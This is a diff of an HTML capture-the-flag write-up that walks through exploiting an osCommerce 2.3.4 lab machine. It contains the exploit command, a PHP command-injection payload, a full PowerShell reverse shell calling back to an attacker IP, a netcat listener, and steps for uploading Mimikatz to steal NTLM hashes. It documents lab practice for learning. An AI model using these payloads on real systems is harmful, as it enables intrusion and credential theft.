@@ -177,5 +177,69 @@ enum4linux -a 10.10.118.119
 
 <p>However, the web app disabled such commands by default ,so lets run another payload from <a href="https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution">Github</a></p>
 
-<p>To understand how the script works, I initially run it just by no parameters and inputs.</p>
+<p>To understand how the script works, I initially ran it just by giving any parameters and inputs.</p>
+
+<p><img src="./images/17.png" alt="alt text" /></p>
+
+<p>Payload that I have used:</p>
+
+<p><code>
+python3 osCommerce2_3_4RCE.py http://10.10.31.69:8080/oscommerce-2.3.4/catalog
+</code></p>
+
+<p>Custom script directly injects the payload through the POST method on <code>install.php?step=4</code> and manipulating DB_DATABASE parameter to include <code>PHP command injection</code> by <code>passthru()</code> method. As you know, I could not use system(); method because of the web app restrictions.</p>
+
+<p>Malicious payload:</p>
+
+<p><code>
+'); passthru('whoami'); /*
+</code></p>
+
+<p><img src="./images/18.png" alt="alt text" /></p>
+
+<p>Although there were not any privilege execution mechanism on script, I had straightforwardly get <code>NT AUTHORITY\SYSTEM</code>. However, still I could not move any paths directly on <code>OS</code>.</p>
+
+<p><img src="./images/19.png" alt="alt text" /></p>
+
+<p>Hence, I also wanted to try again <a href="https://www.exploit-db.com/exploits/44374"><code>Exploit Db</code></a> Maybe I can upgrade my shell with <code>Powershell reverse shell</code>. Because of the script's iteration. I was not able to interact with shell properly. It only allowed me to show <code>current directory</code>.</p>
+
+<p>The payload that I used:
+<code>
+powershell -NoProfile -Command "$client = New-Object System.Net.Sockets.TCPClient(\'10.11.69.113\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \'PS \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+</code></p>
+
+<p>Just change the IP address with your machine and port. You can generate your payloads from here:</p>
+
+<p><a href="https://www.revshells.com/">RevShell Generator</a></p>
+
+<p>Now deploy <code>netcat listener</code>:</p>
+
+<p><code>
+nc -lvnp 4444
+</code></p>
+
+<p><img src="./images/21.png" alt="alt text" /></p>
+
+<p>You can directly paste when you prepare your payload as above. Then switch on the shell that you spawned.</p>
+
+<p>You should wait at least <code>15 seconds</code> to ensure ready your upgraded <code>reverse shell</code>. That's all ! !</p>
+
+<p><img src="./images/22.png" alt="alt text" /></p>
+
+<p>To get <code>LAB</code> user flag, you should use <code>Mimikatz</code> to get the <code>NTLM</code> hash of the user.</p>
+
+<p>Upload <code>mimikatz.exe</code>:</p>
+
+<p>deploy local python server
+<code>
+python -m http.server 3131
+</code></p>
+
+<p>Since the target is x86 device known as 32bit:</p>
+
+<p><img src="./images/23.png" alt="alt text" /></p>
+
+<p>Using <code>mimikatz32.exe</code> is compatible for us. That's all for m today guys ! !</p>
+
+<p>May The Pentest Be With Your ! !</p>
 </body></html>
